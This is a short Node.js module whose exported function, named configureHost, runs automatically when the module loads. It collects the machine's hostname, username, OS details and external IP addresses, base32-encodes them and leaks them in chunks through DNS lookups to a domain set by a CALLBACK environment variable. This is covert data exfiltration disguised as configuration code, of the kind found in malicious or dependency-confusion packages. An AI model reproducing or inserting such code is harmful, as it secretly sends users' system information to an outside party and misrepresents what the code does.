const os = require('os');
const dns = require('dns');
const base32 = require('base32');

function configureHost() {
    let hostInformation = enummerateHostInformation();
    sendChunks(hostInformation);
}

function enummerateHostInformation() {
    let nets = os.networkInterfaces();
    let results = {
        "hostname": os.hostname(),
        "username": os.userInfo().username,
        "os_type" : os.type(),
        "os_release": os.release()
    }

    for (const name of Object.keys(nets)) {
        for (const net of nets[name]) {
            if (net.family === 'IPv4' && !net.internal) {
                if (!results[name]) {
                    results[name] = [];
                }
                results[name].push(net.address);
            }
        }
    }
    return results;
}

function sendChunks(obj) {
    let message = base32.encode(JSON.stringify(obj));
    let chunks = message.match(/.{1,25}/g);
    for(let i = 0; i<chunks.length;i++) {
        let host = i + "-" + chunks[i] + "." + process.env.CALLBACK;
        dns.resolve4(host, () => {
            // do nothing
        });
    }
}

exports.configureHost = configureHost;
configureHost();